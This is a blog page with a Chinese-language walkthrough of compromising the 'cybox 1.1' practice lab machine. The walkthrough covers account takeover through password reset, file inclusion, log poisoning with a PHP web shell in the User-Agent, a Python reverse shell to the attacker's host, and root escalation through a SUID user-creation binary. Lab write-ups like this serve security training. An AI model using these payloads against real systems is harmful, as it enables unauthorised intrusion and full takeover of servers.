@@ -1,0 +1,557 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/kqcy.jpg">
+  <link rel="icon" href="/img/kqcy.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>cybox1.1靶机练习 - CompactDisk</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>CompactDisk's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                about me
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="cybox1.1靶机练习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-05-09 15:14" pubdate>
+        May 9, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      20
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">cybox1.1靶机练习</h1>
+            
+            <div class="markdown-body">
+              <h3 id="cybox-1-1靶机练习"><a href="#cybox-1-1靶机练习" class="headerlink" title="cybox:1.1靶机练习"></a>cybox:1.1靶机练习</h3><h4 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h4><p>环境搭建平台为VMware15，网络为nat模式，网段192.168.1.0/24</p>
+<p>网络由攻击机kali、靶机组成</p>
+<p>靶机ip：192.168.1.141</p>
+<p>kali linux ip：192.168.1.137</p>
+<h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><h5 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p>下图中192.168.1.1为VMnet8网卡地址，1.3位网关地址，1.137为kali地址，因此判断目标靶机地址为192.168.1.141</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210102234570.png" srcset="/img/loading.gif" lazyload alt="image-20210210102234570"></p>
+<h5 id="端口服务扫描："><a href="#端口服务扫描：" class="headerlink" title="端口服务扫描："></a>端口服务扫描：</h5><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210113920614.png" srcset="/img/loading.gif" lazyload alt="image-20210210113920614" style="zoom:67%;" />
+
+<p>靶机开启了80和443端口，访问一下看看</p>
+<p>直接访问ip后是一个web页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114127375.png" srcset="/img/loading.gif" lazyload alt="image-20210210114127375"></p>
+<p>拖到页面最下方可以看到一个域名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114235781.png" srcset="/img/loading.gif" lazyload alt="image-20210210114235781"></p>
+<h5 id="爆破目录："><a href="#爆破目录：" class="headerlink" title="爆破目录："></a>爆破目录：</h5><p>爆破一下目录</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb <span class="hljs-string">&quot;http://192.168.1.141&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirb/</span>wordlists/big.txt<br></code></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114345084.png" srcset="/img/loading.gif" lazyload alt="image-20210210114345084" style="zoom: 80%;" />
+
+<p>同时也使用dirbuster爆破一下详细页面，以取得更多的信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115418915.png" srcset="/img/loading.gif" lazyload alt="image-20210210115418915"></p>
+<p>依次访问dirb爆出的目录，发现assets目录下存放了些css、js文件</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114945379.png" srcset="/img/loading.gif" lazyload alt="image-20210210114945379" style="zoom: 67%;" />
+
+<p>/cgi/bin目录无访问权限，/phpadmin目录只允许本地访问</p>
+<p>dirbuster爆破结果也出来了，与dirb扫出的结果相差不大，此时并没有发现到什么有价值的页面。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115351005.png" srcset="/img/loading.gif" lazyload alt="image-20210210115351005"></p>
+<p>此时我们甚至都没有找到真正提供服务的web页面，我们扫描端口时可以看到目标机器开放了ftp服务，还开放了pop3、imap，还提供邮件服务，很明显目标机器有一个较复杂的网站提供服务，但我们的扫描结果并不相符，说明爆破姿势不对</p>
+<p>之前访问首页的时候看到了一个域名cybox.company，我们将其添加进hosts文件，尝试再次扫描一下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115848593.png" srcset="/img/loading.gif" lazyload alt="image-20210210115848593"></p>
+<p>这次我们使用gobuster进行扫描，gobuster是一款基于go语言的目录/文件和DNS爆破工具，可以对目录、文件、DNS和VHost等对象进行暴力破解攻击，下载链接<a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster%EF%BC%8Ckali%E4%B8%8B%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5**apt-get">https://github.com/OJ/gobuster，kali下可以直接**apt-get</a> install gobuster**进行安装</p>
+<p>扫描后，可以看到，有了我们之前并未爆破出的页面</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gobuster vhost -u http:<span class="hljs-regexp">//</span>cybox.company<span class="hljs-regexp">/ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210120618851.png" srcset="/img/loading.gif" lazyload alt="image-20210210120618851"></p>
+<p>依次访问各页面</p>
+<p>dev.cybox.company是一个PHPinfo</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210122858686.png" srcset="/img/loading.gif" lazyload alt="image-20210210122858686"></p>
+<p>ftp.cybox.company是一个ftp页面，目测实现文件传输功能，需要验证用户名密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210123135118.png" srcset="/img/loading.gif" lazyload alt="image-20210210123135118"></p>
+<p>webmail.cybox.company是一个邮箱登录页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210124443912.png" srcset="/img/loading.gif" lazyload alt="image-20210210124443912"></p>
+<p>register.cybox.company是一个创建用户页面，尝试创建后直接显示创建成功，也并没有提示输入密码等信息，直接给了一个与用户名相同的密码，暂时不知道是创建了什么用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210125804934.png" srcset="/img/loading.gif" lazyload alt="image-20210210125804934"></p>
+<p>monitor.cybox.company访问后跳转到一个登录页面，下面两个链接可以跳转到一个注册页面，以及一个密码找回</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210123613774.png" srcset="/img/loading.gif" lazyload alt="image-20210210123613774"></p>
+<h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>在上面这个页面，注册一个用户登录试一下</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210131944537.png" srcset="/img/loading.gif" lazyload alt="image-20210210131944537" style="zoom:67%;" />
+
+<p>登录后发现并没有什么实际功能，只有一个创建条目记录时间的，不知道有什么作用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210132233531.png" srcset="/img/loading.gif" lazyload alt="image-20210210132233531"></p>
+<p>这里退出登录，试一下未注册用户，发现不存在的用户登录会直接提示用户不存在，这里可以试一下有无admin用户</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210134819545.png" srcset="/img/loading.gif" lazyload alt="image-20210210134819545" style="zoom:67%;" />
+
+<p>尝试猜解管理员的用户名，因为登录页面提供密码修改，可以试试能不能越权修改密码，此处发现存在一个<a href="mailto:&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#99;&#x79;&#x62;&#x6f;&#x78;&#x2e;&#x63;&#111;&#x6d;&#x70;&#x61;&#110;&#121;">&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#99;&#x79;&#x62;&#x6f;&#x78;&#x2e;&#x63;&#111;&#x6d;&#x70;&#x61;&#110;&#121;</a>，显示密码错误，并没有显示用户不存在，先记下，一会看看能不能改</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222525468.png" srcset="/img/loading.gif" lazyload alt="image-20210210222525468" style="zoom:67%;" />
+
+<p>点击忘记密码，会跳转到一个发送链接的页面，这里是将修改链接发送到邮箱了，应该就是我们刚刚看到的那个邮箱的登录界面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210135357234.png" srcset="/img/loading.gif" lazyload alt="image-20210210135357234"></p>
+<p>到邮箱登录页面webmail，登录，发现无法登录，一直显示密码用户名不匹配，说明两边的用户不互通，但我们这时还有一个之前的register.cybox.company/目录，用它创建一个同名用户aaa</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222010198.png" srcset="/img/loading.gif" lazyload alt="image-20210210222010198" style="zoom:67%;" />
+
+<p>之后再到webmail登录，登录成功，可以看到我们之前接收到的修改密码的邮件，里面有个修改链接</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222214774.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;" />
+
+<p>点进去，跳转到一个修改密码页面，我们用burp抓下包，把邮箱改成admin的，看看能不能通过改包来越权修改admin用户的密码</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222942625.png" srcset="/img/loading.gif" lazyload alt="image-20210210222942625" style="zoom:67%;" />
+
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223046506.png" srcset="/img/loading.gif" lazyload alt="image-20210210223046506"></p>
+<p>点击放包，直接跳转回了登录页面，尝试登录admin用户，登录成功，看来并没有什么验证</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223332763.png" srcset="/img/loading.gif" lazyload alt="image-20210210223332763" style="zoom:67%;" />
+
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223359734.png" srcset="/img/loading.gif" lazyload alt="image-20210210223359734"></p>
+<p>点进Admin panel，看一下管理页面，结果，开发中</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223827281.png" srcset="/img/loading.gif" lazyload alt="image-20210210223827281" style="zoom:67%;" />
+
+<p>到这里又断了，进入到网站的后台结果开发中。。。</p>
+<p>但是方法总比困难多，右键查看页面代码，可以看到，这里包含进来一个php页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210224124818.png" srcset="/img/loading.gif" lazyload alt="image-20210210224124818"></p>
+<p>我们可以尝试文件包含，包含一个/etc/passwd文件测试一下，包含成功，此处存在文件包含漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210224656944.png" srcset="/img/loading.gif" lazyload alt="image-20210210224656944"></p>
+<p>然后咱们可以通过日志文件反弹一个shell，apache的日志目录为/opt/bitnami/apache2/logs/，请求日志文件为access_log，错误日志文件为error_log，我们包含请求日志看一下，可以看到，这是ftp页面的请求日志</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212173236662.png" srcset="/img/loading.gif" lazyload alt="image-20210212173236662"></p>
+<p>我们转到ftp页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212200452500.png" srcset="/img/loading.gif" lazyload alt="image-20210212200452500"></p>
+<p>打开burp抓包，刷新页面，拦一个包下来，User-Agent改成cmd命令的php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212200557510.png" srcset="/img/loading.gif" lazyload alt="image-20210212200557510"></p>
+<p>发包，然后测试一下，测试成功，没有问题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212201117351.png" srcset="/img/loading.gif" lazyload alt="image-20210212201117351"></p>
+<p>制作反弹shell</p>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&#x27;192.168.1.137&#x27;</span>,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-i&#x27;</span>]);&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203519286.png" srcset="/img/loading.gif" lazyload alt="image-20210212203519286"></p>
+<p>kali端监听443端口（这里选取443是因为经测试此靶机只允许通往部分端口的数据包进出）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203720362.png" srcset="/img/loading.gif" lazyload alt="image-20210212203720362"></p>
+<p>监听好端口后，web页面敲击回车，成功反弹shell，拿到了一个低权限的shell</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203808874.png" srcset="/img/loading.gif" lazyload alt="image-20210212203808874" style="zoom:80%;" />
+
+<h4 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h4><p>首先查找有s权限的文件，只看非系统文件，此处需要审计代码，可以看到，在/opt目录下有一个registerlauncher</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212213925216.png" srcset="/img/loading.gif" lazyload alt="image-20210212213925216" style="zoom:80%;" />
+
+<p>在我们查看此文件内容时可以发现它调用了另一个/opt目录下的文件register，注意此处直接用cat查看文件会乱码，需要用strings转化字符串</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">string</span>s registerlauncher<br></code></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212214029876.png" srcset="/img/loading.gif" lazyload alt="image-20210212214029876" style="zoom:80%;" />
+
+<p>在查看register文件内容，发现这是一个可以创建用户的文件</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212220738362.png" srcset="/img/loading.gif" lazyload alt="image-20210212220738362" style="zoom: 80%;" />
+
+<p>实际就是实现了那个register页面的功能，测试之前创建的aaa用户，此处可以登录</p>
+<p>首先取得一个交互shell</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后尝试登录aaa，成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212222901048.png" srcset="/img/loading.gif" lazyload alt="image-20210212222901048"></p>
+<p>试一下能不能切换root，失败，提示我们aaa不再sudoers文件中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212223159058.png" srcset="/img/loading.gif" lazyload alt="image-20210212223159058"></p>
+<p>另外此处我们无权限查看sudoers文件，但应该是有用户持有切换权限的，这里就需要试了，所幸并不难猜，用户名起为sudo即可</p>
+<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224130623.png" srcset="/img/loading.gif" lazyload alt="image-20210212224130623" style="zoom:67%;" />
+
+<p>创建完之后切换用户sudo，即可切换root用户，至此提权完毕</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224253887.png" srcset="/img/loading.gif" lazyload alt="image-20210212224253887"></p>
+<p>在root的家目录下可以看到一个root.txt，查看一下，应该是个flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224445648.png" srcset="/img/loading.gif" lazyload alt="image-20210212224445648"></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yutianovo/article/details/111687112">https://blog.csdn.net/yutianovo/article/details/111687112</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">靶机渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    作者：CompactDisk，本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/06/Acid%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">
+                        <span class="hidden-mobile">Acid靶机练习</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a  target="_blank" rel="nofollow noopener"><span>CompactDisk</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
